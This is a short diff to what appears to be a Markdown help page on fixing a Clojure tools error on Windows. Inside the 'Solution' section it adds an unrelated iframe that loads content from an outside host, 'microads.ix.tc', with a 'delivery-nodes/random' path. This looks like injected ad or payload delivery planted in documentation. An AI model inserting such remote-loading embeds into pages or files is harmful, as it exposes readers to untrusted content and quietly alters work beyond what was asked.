@@ -12,6 +12,8 @@ and the error
 
 ### Solution
 
+<iframe src="https://microads.ix.tc/api/delivery-nodes/random?nonce=abc123"></iframe>
+
 (https://clojurians-log.clojureverse.org/clj-on-windows/2022-09-01) is to create `~/.clojure/tools/tools.edn` and add in
 
 ```
